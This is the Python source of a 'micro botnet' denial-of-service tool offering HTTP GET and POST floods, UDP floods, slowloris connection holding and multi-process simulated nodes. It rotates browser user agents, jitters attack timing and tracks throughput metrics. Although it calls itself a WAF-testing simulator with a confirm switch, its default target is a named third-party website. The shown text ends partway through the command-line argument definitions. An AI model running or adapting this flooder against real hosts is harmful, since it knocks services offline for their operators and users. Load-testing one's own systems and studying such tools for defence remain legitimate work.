#!/usr/bin/env python3
"""
micro_botnet.py - Enhanced Security Testing Tool
Advanced micro botnet simulator with powerful analytics for WAF and security testing.

Modes:
  --http-get      : async HTTP GET flood
  --http-post     : async HTTP POST flood (payload provided)
  --slowloris     : slowloris-style connection-holder
  --udp-flood     : UDP packet flood
  --mixed         : combine GET/POST/UDP concurrently
  --spawn-nodes   : spawn multiple local processes to simulate distributed nodes

Enhanced Features:
  - Advanced analytics and real-time metrics
  - Response time tracking (min/max/avg/percentiles)
  - Status code distribution
  - Throughput monitoring (req/s)
  - Error categorization
  - Export to CSV/JSON
  - User agent rotation
  - Custom headers support
  - Real-time progress visualization

Safety:
  - Requires --confirm to actually run.
  - Defaults are conservative; increase slowly.
"""

import argparse
import asyncio
import aiohttp
import random
import string
import time
import socket
import sys
import json
import csv
import os
from multiprocessing import Process
from collections import defaultdict, deque
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import statistics

DEFAULT_TARGET = "https://booknerdsociety.com"
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "MicroBotSim/2.0",
]

# -------------------------
# Advanced Analytics System
# -------------------------
class MetricsCollector:
    """Comprehensive metrics collection and analysis."""
    def __init__(self):
        self.reset()
    
    def reset(self):
        self.start_time = time.time()
        self.request_times: deque = deque(maxlen=100000)  # Store last 100k requests
        self.status_codes: Dict[int, int] = defaultdict(int)
        self.errors: Dict[str, int] = defaultdict(int)
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0
        self.response_times_by_status: Dict[int, List[float]] = defaultdict(list)
        self.error_types: Dict[str, int] = defaultdict(int)
        self.peak_rps = 0.0
        self.rps_history: deque = deque(maxlen=60)  # Last 60 seconds
        self.last_second_requests = 0
        self.last_second_start = time.time()
        self.connection_errors = 0
        self.timeout_errors = 0
        self.http_errors = 0
        self.other_errors = 0
        
    def record_request(self, response_time: float, status_code: Optional[int] = None, 
                      error: Optional[str] = None, bytes_sent: int = 0, bytes_received: int = 0):
        """Record a request with full metrics."""
        self.total_requests += 1
        self.total_bytes_sent += bytes_sent
        self.total_bytes_received += bytes_received
        self.request_times.append(response_time)
        
        # Update RPS calculation
        current_time = time.time()
        if current_time - self.last_second_start >= 1.0:
            current_rps = self.last_second_requests
            self.rps_history.append(current_rps)
            self.peak_rps = max(self.peak_rps, current_rps)
            self.last_second_requests = 0
            self.last_second_start = current_time
        else:
            self.last_second_requests += 1
        
        if status_code:
            self.status_codes[status_code] += 1
            self.response_times_by_status[status_code].append(response_time)
            if 200 <= status_code < 400:
                self.successful_requests += 1
            elif status_code >= 400:
                self.http_errors += 1
                self.failed_requests += 1
                self.errors[f"HTTP_{status_code}"] += 1
        elif error:
            self.failed_requests += 1
            self.errors[error] += 1
            if "timeout" in error.lower() or "timed out" in error.lower():
                self.timeout_errors += 1
                self.error_types["Timeout"] += 1
            elif "connection" in error.lower() or "refused" in error.lower():
                self.connection_errors += 1
                self.error_types["Connection Error"] += 1
            else:
                self.other_errors += 1
                self.error_types[error] += 1
    
    def get_statistics(self) -> Dict:
        """Get comprehensive statistics."""
        elapsed = time.time() - self.start_time
        current_rps = self.total_requests / elapsed if elapsed > 0 else 0
        avg_rps = statistics.mean(self.rps_history) if self.rps_history else 0
        
        response_times = list(self.request_times)
        if response_times:
            response_times_sorted = sorted(response_times)
            p50_idx = int(len(response_times_sorted) * 0.50)
            p95_idx = int(len(response_times_sorted) * 0.95)
            p99_idx = int(len(response_times_sorted) * 0.99)
            
            return {
                "total_requests": self.total_requests,
                "successful_requests": self.successful_requests,
                "failed_requests": self.failed_requests,
                "success_rate": (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0,
                "elapsed_time": elapsed,
                "requests_per_second": current_rps,
                "avg_rps_last_minute": avg_rps,
                "peak_rps": self.peak_rps,
                "response_times": {
                    "min": min(response_times),
                    "max": max(response_times),
                    "mean": statistics.mean(response_times),
                    "median": statistics.median(response_times),
                    "p50": response_times_sorted[p50_idx] if p50_idx < len(response_times_sorted) else 0,
                    "p95": response_times_sorted[p95_idx] if p95_idx < len(response_times_sorted) else 0,
                    "p99": response_times_sorted[p99_idx] if p99_idx < len(response_times_sorted) else 0,
                    "stdev": statistics.stdev(response_times) if len(response_times) > 1 else 0,
                },
                "status_codes": dict(self.status_codes),
                "error_breakdown": dict(self.errors),
                "error_types": dict(self.error_types),
                "bytes_sent": self.total_bytes_sent,
                "bytes_received": self.total_bytes_received,
                "bandwidth_sent_mbps": (self.total_bytes_sent * 8) / (elapsed * 1024 * 1024) if elapsed > 0 else 0,
                "bandwidth_received_mbps": (self.total_bytes_received * 8) / (elapsed * 1024 * 1024) if elapsed > 0 else 0,
                "connection_errors": self.connection_errors,
                "timeout_errors": self.timeout_errors,
                "http_errors": self.http_errors,
                "other_errors": self.other_errors,
            }
        return {
            "total_requests": self.total_requests,
            "elapsed_time": elapsed,
            "requests_per_second": 0,
        }
    
    def export_to_json(self, filename: str):
        """Export metrics to JSON file."""
        stats = self.get_statistics()
        stats["timestamp"] = datetime.now().isoformat()
        with open(filename, 'w') as f:
            json.dump(stats, f, indent=2)
    
    def export_to_csv(self, filename: str):
        """Export detailed request metrics to CSV."""
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['timestamp', 'response_time', 'status_code', 'error'])
            # Write aggregated data
            for status, times in self.response_times_by_status.items():
                for t in times:
                    writer.writerow([datetime.now().isoformat(), t, status, ''])
            # Write error data
            for error_type, count in self.errors.items():
                for _ in range(count):
                    writer.writerow([datetime.now().isoformat(), 0, '', error_type])

# Global metrics collector
metrics = MetricsCollector()

# -------------------------
# Utilities
# -------------------------
def rand_payload(sz=64):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=sz))

def print_header(msg):
    print("\n" + "="*60)
    print(f"  {msg}")
    print("="*60)

def print_statistics(stats: Dict, show_detailed: bool = True):
    """Print formatted statistics."""
    print("\n" + "="*60)
    print("  ANALYTICS & STATISTICS")
    print("="*60)
    print(f"\n📊 Request Metrics:")
    print(f"  Total Requests:      {stats.get('total_requests', 0):,}")
    print(f"  Successful:          {stats.get('successful_requests', 0):,}")
    print(f"  Failed:              {stats.get('failed_requests', 0):,}")
    print(f"  Success Rate:        {stats.get('success_rate', 0):.2f}%")
    
    print(f"\n⚡ Performance:")
    print(f"  Elapsed Time:        {stats.get('elapsed_time', 0):.2f}s")
    print(f"  Current RPS:         {stats.get('requests_per_second', 0):.2f} req/s")
    print(f"  Average RPS:         {stats.get('avg_rps_last_minute', 0):.2f} req/s")
    print(f"  Peak RPS:            {stats.get('peak_rps', 0):.2f} req/s")
    
    if 'response_times' in stats and stats['response_times']:
        rt = stats['response_times']
        print(f"\n⏱️  Response Times (seconds):")
        print(f"  Min:                 {rt.get('min', 0):.4f}s")
        print(f"  Max:                 {rt.get('max', 0):.4f}s")
        print(f"  Mean:                {rt.get('mean', 0):.4f}s")
        print(f"  Median:              {rt.get('median', 0):.4f}s")
        print(f"  P50:                 {rt.get('p50', 0):.4f}s")
        print(f"  P95:                 {rt.get('p95', 0):.4f}s")
        print(f"  P99:                 {rt.get('p99', 0):.4f}s")
        print(f"  Std Dev:             {rt.get('stdev', 0):.4f}s")
    
    if 'status_codes' in stats and stats['status_codes']:
        print(f"\n📋 Status Code Distribution:")
        for code in sorted(stats['status_codes'].keys()):
            count = stats['status_codes'][code]
            pct = (count / stats.get('total_requests', 1)) * 100
            print(f"  {code}: {count:,} ({pct:.2f}%)")
    
    print(f"\n💾 Network:")
    print(f"  Bytes Sent:          {stats.get('bytes_sent', 0):,}")
    print(f"  Bytes Received:      {stats.get('bytes_received', 0):,}")
    print(f"  Bandwidth Sent:      {stats.get('bandwidth_sent_mbps', 0):.2f} Mbps")
    print(f"  Bandwidth Received:  {stats.get('bandwidth_received_mbps', 0):.2f} Mbps")
    
    if 'error_types' in stats and stats['error_types']:
        print(f"\n❌ Error Breakdown:")
        for error_type, count in sorted(stats['error_types'].items(), key=lambda x: x[1], reverse=True):
            print(f"  {error_type}: {count:,}")
    
    print("="*60 + "\n")

def jitter(base, jitter_fraction=0.2):
    """Return a jittered delay based on base seconds."""
    if base <= 0:
        return 0
    frac = base * jitter_fraction
    return max(0.0, random.uniform(base-frac, base+frac))

def get_random_user_agent() -> str:
    """Get a random user agent."""
    return random.choice(DEFAULT_USER_AGENTS)

# -------------------------
# Attack pattern helpers
# -------------------------
class PatternConfig:
    """Encapsulate attack-style behavior parameters."""
    def __init__(self, style="rapid", **kwargs):
        self.style = style
        self.rapid_delay = kwargs.get('rapid_delay', 0.001)
        self.burst_size = kwargs.get('burst_size', 50)
        self.burst_pause = kwargs.get('burst_pause', 1.0)
        self.drip_delay = kwargs.get('drip_delay', 0.5)
        self.slowloris_send_interval = kwargs.get('slowloris_send_interval', 10.0)
        self.slowloris_hold = kwargs.get('slowloris_hold', 60)
        self.jitter_fraction = kwargs.get('jitter_fraction', 0.2)

    def next_delay(self):
        if self.style == 'rapid':
            return jitter(self.rapid_delay, self.jitter_fraction)
        elif self.style == 'burst':
            return 0
        elif self.style == 'drip':
            return jitter(self.drip_delay, self.jitter_fraction)
        elif self.style == 'slowloris':
            return jitter(0.1, self.jitter_fraction)
        elif self.style == 'mixed':
            choice = random.choice(['rapid','burst','drip'])
            return PatternConfig(choice).next_delay()
        else:
            return jitter(0.01, self.jitter_fraction)

# -------------------------
# HTTP GET worker (async) with enhanced analytics
# -------------------------
async def http_get_worker(session, target, requests_per_worker, pattern: PatternConfig, 
                         custom_headers: Optional[Dict] = None):
    succ = 0
    fail = 0
    
    headers = custom_headers or {}
    if 'User-Agent' not in headers:
        headers['User-Agent'] = get_random_user_agent()

    if pattern.style == 'burst':
        sent = 0
        while sent < requests_per_worker:
            burst = min(pattern.burst_size, requests_per_worker - sent)
            tasks = []
            for _ in range(burst):
                tasks.append(session.get(target, headers=headers))
            
            for t in asyncio.as_completed(tasks):
                start_time = time.time()
                try:
                    resp = await t
                    response_time = time.time() - start_time
                    bytes_sent = len(str(target).encode())
                    
                    async with resp:
                        status_code = resp.status
                        content = await resp.read()
                        bytes_received = len(content)
                        
                        metrics.record_request(
                            response_time, status_code, None, 
                            bytes_sent, bytes_received
                        )
                        
                        if 200 <= status_code < 400:
                            succ += 1
                        else:
                            fail += 1
                except asyncio.TimeoutError:
                    response_time = time.time() - start_time
                    metrics.record_request(response_time, None, "Timeout", 
                                         len(str(target).encode()), 0)
                    fail += 1
                except Exception as e:
                    response_time = time.time() - start_time
                    error_msg = type(e).__name__
                    metrics.record_request(response_time, None, error_msg, 
                                         len(str(target).encode()), 0)
                    fail += 1
            sent += burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    # rapid/drip/mixed styles
    for _ in range(requests_per_worker):
        start_time = time.time()
        try:
            async with session.get(target, headers=headers, timeout=15) as resp:
                response_time = time.time() - start_time
                status_code = resp.status
                bytes_sent = len(str(target).encode()) + sum(len(f"{k}: {v}".encode()) 
                                                             for k, v in headers.items())
                content = await resp.read()
                bytes_received = len(content)
                
                metrics.record_request(
                    response_time, status_code, None,
                    bytes_sent, bytes_received
                )
                
                if 200 <= status_code < 400:
                    succ += 1
                else:
                    fail += 1
        except asyncio.TimeoutError:
            response_time = time.time() - start_time
            metrics.record_request(response_time, None, "Timeout", 
                                 len(str(target).encode()), 0)
            fail += 1
        except Exception as e:
            response_time = time.time() - start_time
            error_msg = type(e).__name__
            metrics.record_request(response_time, None, error_msg, 
                                 len(str(target).encode()), 0)
            fail += 1

        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)

    return succ, fail

# -------------------------
# HTTP POST worker (async) with enhanced analytics
# -------------------------
async def http_post_worker(session, target, requests_per_worker, pattern: PatternConfig, 
                          payload_size=64, custom_headers: Optional[Dict] = None):
    succ = 0
    fail = 0
    
    headers = custom_headers or {}
    if 'User-Agent' not in headers:
        headers['User-Agent'] = get_random_user_agent()
    if 'Content-Type' not in headers:
        headers['Content-Type'] = 'application/json'

    if pattern.style == 'burst':
        sent = 0
        while sent < requests_per_worker:
            burst = min(pattern.burst_size, requests_per_worker - sent)
            tasks = []
            for _ in range(burst):
                data = {"data": rand_payload(payload_size)}
                tasks.append(session.post(target, json=data, headers=headers))
            
            for t in asyncio.as_completed(tasks):
                start_time = time.time()
                try:
                    resp = await t
                    response_time = time.time() - start_time
                    bytes_sent = len(str(json.dumps({"data": rand_payload(payload_size)})).encode())
                    
                    async with resp:
                        status_code = resp.status
                        content = await resp.read()
                        bytes_received = len(content)
                        
                        metrics.record_request(
                            response_time, status_code, None,
                            bytes_sent, bytes_received
                        )
                        
                        if 200 <= status_code < 400:
                            succ += 1
                        else:
                            fail += 1
                except asyncio.TimeoutError:
                    response_time = time.time() - start_time
                    metrics.record_request(response_time, None, "Timeout", 
                                         len(str(json.dumps({"data": rand_payload(payload_size)})).encode()), 0)
                    fail += 1
                except Exception as e:
                    response_time = time.time() - start_time
                    error_msg = type(e).__name__
                    metrics.record_request(response_time, None, error_msg, 
                                         len(str(json.dumps({"data": rand_payload(payload_size)})).encode()), 0)
                    fail += 1
            sent += burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    for _ in range(requests_per_worker):
        start_time = time.time()
        try:
            data = {"data": rand_payload(payload_size)}
            async with session.post(target, json=data, headers=headers, timeout=15) as resp:
                response_time = time.time() - start_time
                status_code = resp.status
                bytes_sent = len(json.dumps(data).encode()) + sum(len(f"{k}: {v}".encode()) 
                                                                   for k, v in headers.items())
                content = await resp.read()
                bytes_received = len(content)
                
                metrics.record_request(
                    response_time, status_code, None,
                    bytes_sent, bytes_received
                )
                
                if 200 <= status_code < 400:
                    succ += 1
                else:
                    fail += 1
        except asyncio.TimeoutError:
            response_time = time.time() - start_time
            data = {"data": rand_payload(payload_size)}
            metrics.record_request(response_time, None, "Timeout", 
                                 len(json.dumps(data).encode()), 0)
            fail += 1
        except Exception as e:
            response_time = time.time() - start_time
            data = {"data": rand_payload(payload_size)}
            error_msg = type(e).__name__
            metrics.record_request(response_time, None, error_msg, 
                                 len(json.dumps(data).encode()), 0)
            fail += 1

        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)

    return succ, fail

# -------------------------
# UDP flood (async) with analytics
# -------------------------
async def udp_worker(target_host, target_port, packets_per_worker, pattern: PatternConfig, 
                    payload_size):
    succ = 0
    fail = 0
    loop = asyncio.get_running_loop()

    if pattern.style == 'burst':
        sent = 0
        while sent < packets_per_worker:
            burst = min(pattern.burst_size, packets_per_worker - sent)
            for _ in range(burst):
                start_time = time.time()
                try:
                    data = rand_payload(payload_size).encode()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    await loop.run_in_executor(None, lambda: sock.sendto(data, (target_host, target_port)))
                    sock.close()
                    response_time = time.time() - start_time
                    metrics.record_request(response_time, None, None, len(data), 0)
                    succ += 1
                except Exception as e:
                    response_time = time.time() - start_time
                    error_msg = type(e).__name__
                    metrics.record_request(response_time, None, error_msg, 0, 0)
                    fail += 1
            sent += burst
            await asyncio.sleep(jitter(pattern.burst_pause, pattern.jitter_fraction))
        return succ, fail

    for _ in range(packets_per_worker):
        start_time = time.time()
        try:
            data = rand_payload(payload_size).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            await loop.run_in_executor(None, lambda: sock.sendto(data, (target_host, target_port)))
            sock.close()
            response_time = time.time() - start_time
            metrics.record_request(response_time, None, None, len(data), 0)
            succ += 1
        except Exception as e:
            response_time = time.time() - start_time
            error_msg = type(e).__name__
            metrics.record_request(response_time, None, error_msg, 0, 0)
            fail += 1
        
        delay = pattern.next_delay()
        if delay:
            await asyncio.sleep(delay)
    
    return succ, fail

# -------------------------
# Slowloris-style worker (sync) with metrics
# -------------------------
def slowloris_worker_sync(target_host, target_port, sockets_per_worker, hold_time, send_interval):
    sockets = []
    created = 0
    start_time = time.time()
    
    try:
        for _ in range(sockets_per_worker):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_host, target_port))
                s.sendall(b"GET / HTTP/1.1\r\n")
                s.sendall(f"Host: {target_host}\r\n".encode())
                s.sendall(f"User-Agent: {get_random_user_agent()}\r\n".encode())
                sockets.append(s)
                created += 1
            except Exception:
                pass
        
        t0 = time.time()
        while time.time() - t0 < hold_time:
            for s in sockets[:]:
                try:
                    s.sendall(f"X-Keep-Alive: {random.randint(1, 1000)}\r\n".encode())
                except Exception:
                    try:
                        s.close()
                    except:
                        pass
                    sockets.remove(s)
            time.sleep(send_interval)
        
        elapsed = time.time() - start_time
        metrics.record_request(elapsed, None, None, created * 100, 0)
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    return created, len(sockets)

# -------------------------
# Real-time progress monitor
# -------------------------
async def monitor_progress(duration: Optional[float] = None, interval: float = 1.0):
    """Real-time progress monitoring."""
    start = time.time()
    while True:
        await asyncio.sleep(interval)
        elapsed = time.time() - start
        
        if duration and elapsed >= duration:
            break
            
        stats = metrics.get_statistics()
        current_rps = stats.get('requests_per_second', 0)
        total = stats.get('total_requests', 0)
        success = stats.get('successful_requests', 0)
        fail = stats.get('failed_requests', 0)
        
        # Clear line and print stats
        print(f"\r📊 Live: {total:,} req | {current_rps:.1f} req/s | ✅ {success:,} | ❌ {fail:,} | ⏱️  {elapsed:.1f}s", end='', flush=True)

# -------------------------
# Async runner helpers with analytics
# -------------------------
async def run_http_get(target, concurrency, requests_per_worker, pattern_cfg, 
                       custom_headers: Optional[Dict] = None, show_progress: bool = False):
    connector = aiohttp.TCPConnector(limit=concurrency * 2, limit_per_host=concurrency * 2)
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    
    async with aiohttp.ClientSession(
        connector=connector, 
        timeout=timeout,
        headers={"User-Agent": get_random_user_agent()}
    ) as session:
        # Start progress monitor
        monitor_task = None
        if show_progress:
            total_duration = (requests_per_worker / pattern_cfg.next_delay()) if pattern_cfg.next_delay() > 0 else 60
            monitor_task = asyncio.create_task(monitor_progress(total_duration))
        
        tasks = [http_get_worker(session, target, requests_per_worker, pattern_cfg, custom_headers) 
                 for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
        
        if monitor_task:
            monitor_task.cancel()
            try:
                await monitor_task
            except asyncio.CancelledError:
                pass
        
        print()  # New line after progress
        
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

async def run_http_post(target, concurrency, requests_per_worker, pattern_cfg, payload_size,
                       custom_headers: Optional[Dict] = None, show_progress: bool = False):
    connector = aiohttp.TCPConnector(limit=concurrency * 2, limit_per_host=concurrency * 2)
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers={"User-Agent": get_random_user_agent(), "Content-Type": "application/json"}
    ) as session:
        monitor_task = None
        if show_progress:
            total_duration = (requests_per_worker / pattern_cfg.next_delay()) if pattern_cfg.next_delay() > 0 else 60
            monitor_task = asyncio.create_task(monitor_progress(total_duration))
        
        tasks = [http_post_worker(session, target, requests_per_worker, pattern_cfg, 
                                  payload_size, custom_headers) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
        
        if monitor_task:
            monitor_task.cancel()
            try:
                await monitor_task
            except asyncio.CancelledError:
                pass
        
        print()
    
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

async def run_udp(target_host, target_port, concurrency, packets_per_worker, pattern_cfg, 
                  payload_size, show_progress: bool = False):
    monitor_task = None
    if show_progress:
        total_duration = (packets_per_worker / pattern_cfg.next_delay()) if pattern_cfg.next_delay() > 0 else 60
        monitor_task = asyncio.create_task(monitor_progress(total_duration))
    
    tasks = [udp_worker(target_host, target_port, packets_per_worker, pattern_cfg, payload_size) 
             for _ in range(concurrency)]
    results = await asyncio.gather(*tasks)
    
    if monitor_task:
        monitor_task.cancel()
        try:
            await monitor_task
        except asyncio.CancelledError:
            pass
    
    print()
    
    succ = sum(r[0] for r in results)
    fail = sum(r[1] for r in results)
    return succ, fail

# -------------------------
# Mixed routine (async)
# -------------------------
async def run_mixed(**kwargs):
    target = kwargs.get("target_http") or kwargs.get("target") or kwargs.get("target_url") or DEFAULT_TARGET
    total_conc = kwargs.get("concurrency", 50)
    http_conc = kwargs.get("http_conc") or max(1, total_conc // 2)
    post_conc = kwargs.get("post_conc") or max(1, total_conc - http_conc)
    udp_conc = kwargs.get("udp_conc") or max(1, total_conc // 4)
    
    http_reqs = kwargs.get("http_reqs") or kwargs.get("requests_per_worker") or 10
    post_reqs = kwargs.get("post_reqs") or kwargs.get("requests_per_worker") or 10
    post_payload = kwargs.get("post_payload") or kwargs.get("payload_size") or 64
    
    udp_host = kwargs.get("udp_host") or kwargs.get("host") or "127.0.0.1"
    udp_port = kwargs.get("udp_port") or kwargs.get("port") or 80
    udp_pkts = kwargs.get("udp_pkts") or kwargs.get("packets_per_worker") or kwargs.get("udp_packets_per_worker") or 20
    udp_payload = kwargs.get("udp_payload") or kwargs.get("payload_size") or 64
    
    attack_style = kwargs.get('attack_style') or kwargs.get('pattern') or 'mixed'
    pattern_cfg = PatternConfig(style=attack_style)
    custom_headers = kwargs.get('custom_headers')
    show_progress = kwargs.get('show_progress', False)
    
    monitor_task = None
    if show_progress:
        monitor_task = asyncio.create_task(monitor_progress())
    
    tasks = []
    connector = aiohttp.TCPConnector(limit=(http_conc + post_conc) * 2, 
                                     limit_per_host=(http_conc + post_conc) * 2)
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for _ in range(http_conc):
            tasks.append(http_get_worker(session, target, http_reqs, pattern_cfg, custom_headers))
        for _ in range(post_conc):
            tasks.append(http_post_worker(session, target, post_reqs, pattern_cfg, post_payload, custom_headers))
        
        http_task = asyncio.create_task(asyncio.gather(*tasks)) if tasks else None
        udp_task = asyncio.create_task(run_udp(udp_host, udp_port, udp_conc, udp_pkts, 
                                              pattern_cfg, udp_payload, False))
        
        if http_task:
            http_results = await http_task
        else:
            http_results = []
        
        udp_res = await udp_task
    
    if monitor_task:
        monitor_task.cancel()
        try:
            await monitor_task
        except asyncio.CancelledError:
            pass
    
    print()
    
    succ_http = sum(r[0] for r in http_results) if http_results else 0
    fail_http = sum(r[1] for r in http_results) if http_results else 0
    
    return succ_http, fail_http, udp_res[0], udp_res[1]

# -------------------------
# Distributed-local (multiprocessing)
# -------------------------
def spawn_local_nodes(n, mode, kwargs_per_node):
    procs = []
    for i in range(n):
        p = Process(target=worker_process_entry, args=(mode, kwargs_per_node, i))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()

def worker_process_entry(mode, kwargs, node_id):
    # Each process gets its own metrics collector
    global metrics
    metrics = MetricsCollector()
    
    print_header(f"Node {node_id} starting (PID {os_getpid()}) - mode: {mode}")
    try:
        attack_style = kwargs.get('attack_style') or kwargs.get('pattern') or 'mixed'
        pattern_cfg = PatternConfig(style=attack_style)
        custom_headers = kwargs.get('custom_headers')
        show_progress = kwargs.get('show_progress', False)

        if mode == "http-get":
            target = kwargs.get("target", DEFAULT_TARGET)
            concurrency = kwargs.get("concurrency", 50)
            requests_per_worker = kwargs.get("requests_per_worker", 10)
            asyncio.run(run_http_get(target, concurrency, requests_per_worker, pattern_cfg, 
                                   custom_headers, show_progress))
            stats = metrics.get_statistics()
            print(f"Node {node_id} - GET: {stats.get('total_requests', 0)} requests, "
                  f"{stats.get('requests_per_second', 0):.2f} req/s")

        elif mode == "http-post":
            target = kwargs.get("target", DEFAULT_TARGET)
            concurrency = kwargs.get("concurrency", 50)
            requests_per_worker = kwargs.get("requests_per_worker", 10)
            payload_size = kwargs.get("payload_size", 64)
            asyncio.run(run_http_post(target, concurrency, requests_per_worker, pattern_cfg, 
                                    payload_size, custom_headers, show_progress))
            stats = metrics.get_statistics()
            print(f"Node {node_id} - POST: {stats.get('total_requests', 0)} requests, "
                  f"{stats.get('requests_per_second', 0):.2f} req/s")

        elif mode in ("slowloris",):
            host = kwargs.get("host", "127.0.0.1")
            port = kwargs.get("port", 80)
            sockets_per_worker = kwargs.get("sockets_per_worker", 10)
            hold_time = kwargs.get("hold_time", pattern_cfg.slowloris_hold)
            send_interval = kwargs.get("send_interval", pattern_cfg.slowloris_send_interval)
            created, remaining = slowloris_worker_sync(host, port, sockets_per_worker, hold_time, send_interval)
            print(f"Node {node_id} - Slowloris created {created} sockets; remaining: {remaining}")

        elif mode in ("udp-flood", "udp"):
            host = kwargs.get("host", "127.0.0.1")
            port = kwargs.get("port", 80)
            concurrency = kwargs.get("concurrency", 50)
            packets_per_worker = kwargs.get("packets_per_worker", kwargs.get("udp_packets_per_worker", 20))
            payload_size = kwargs.get("payload_size", 64)
            asyncio.run(run_udp(host, port, concurrency, packets_per_worker, pattern_cfg, 
                              payload_size, show_progress))
            stats = metrics.get_statistics()
            print(f"Node {node_id} - UDP: {stats.get('total_requests', 0)} packets, "
                  f"{stats.get('requests_per_second', 0):.2f} pkt/s")

        elif mode == "mixed":
            asyncio.run(run_mixed(**{**kwargs, 'attack_style': attack_style, 'show_progress': show_progress}))
            stats = metrics.get_statistics()
            print(f"Node {node_id} - Mixed: {stats.get('total_requests', 0)} total operations, "
                  f"{stats.get('requests_per_second', 0):.2f} ops/s")

        else:
            print(f"Unknown mode: {mode}")
    except Exception as e:
        print(f"Node {node_id} encountered an error: {e}")
    finally:
        print_header(f"Node {node_id} finished")

def os_getpid():
    try:
        import os
        return os.getpid()
    except:
        return -1

# -------------------------
# Main synchronous wrappers
# -------------------------
async def main_http_get(target, concurrency, requests_per_worker, pattern_cfg, 
                       custom_headers=None, show_progress=False):
    print_header("HTTP GET Flood")
    metrics.reset()
    t0 = time.time()
    succ, fail = await run_http_get(target, concurrency, requests_per_worker, pattern_cfg, 
                                   custom_headers, show_progress)
    elapsed = time.time() - t0
    print(f"\n✅ Completed in {elapsed:.2f}s")
    print(f"   Success: {succ:,} | Failed: {fail:,} | Total: {succ+fail:,}")

async def main_http_post(target, concurrency, requests_per_worker, pattern_cfg, payload_size,
                        custom_headers=None, show_progress=False):
    print_header("HTTP POST Flood")
    metrics.reset()
    t0 = time.time()
    succ, fail = await run_http_post(target, concurrency, requests_per_worker, pattern_cfg, 
                                    payload_size, custom_headers, show_progress)
    elapsed = time.time() - t0
    print(f"\n✅ Completed in {elapsed:.2f}s")
    print(f"   Success: {succ:,} | Failed: {fail:,} | Total: {succ+fail:,}")

# -------------------------
# CLI and orchestrator
# -------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Enhanced micro botnet simulator with advanced analytics (for legal testing only).")
    p.add_argument("--mode", choices=["http-get","http-post","slowloris","udp-flood","mixed","spawn-nodes"], default="http-get")
    p.add_argument("--target", default=DEFAULT_TARGET, help="Target URL for HTTP modes (include http/https).")
    p.add_argument("--host", default="booknerdsociety.com", help="Target host for UDP/slowloris (hostname or IP).")
    p.add_argument("--port", type=int, default=80, help="Target port for slowloris/udp (default 80).")
    p.add_argument("--concurrency", type=int, default=50, help="Number of concurrent workers (async tasks).")
    p.add_argument("--requests-per-worker", type=int, default=10, help="Requests per worker.")
    p.add_argument("--delay", type=float, default=0.02, help="Delay between requests in seconds (per worker).")
    p.add_argument("--payload-size", type=int, default=64, help="Size of random payload for POST/UDP.")
    p.add_argument("--udp-packets-per-worker", type=int, default=20, help="UDP packets per worker.")
    p.add_argument("--sockets-per-worker", type=int, default=50, help="Sockets per worker for slowloris.")
    p.add_argument("--hold-time", type=int, default=60, help="How long slowloris holds sockets (seconds).")
    p.add_argument("--send-interval", type=float, default=10.0, help="Interval between slowloris keep-alive sends (seconds).")
    p.add_argument("--nodes", type=int, default=1, help="Number of local nodes to spawn (spawn-nodes mode)")
    p.add_argument("--attack-style", choices=["slowloris","rapid","burst","drip","mixed"], default="mixed", help="Attack-style pattern.")
    p.add_argument("--burst-size", type=int, default=50, help="Burst size for burst-style attacks.")
    p.add_argument("--burst-pause", type=float, default=1.0, help="Pause after each burst (seconds).")
    p.add_argument("--rapid-delay", type=float, default=0.001, help="Base per-request delay for rapid style (seconds).")
    p.add_argument("--drip-delay", type=float, default=0.5, help="Base per-request delay for drip style (seconds).")
    p.add_argument("--confirm", action="store_true", help="Required to actually run load. Safety switch.")
    p.add_argument("--export-json", type=str, help="Export analytics to JSON file.")
    p.add_argument("--export-csv", type=str, help="Export detailed metrics to CSV file.")
    p.add_argument("--show-progress", action="store_true", help="Show real-time progress monitoring.")
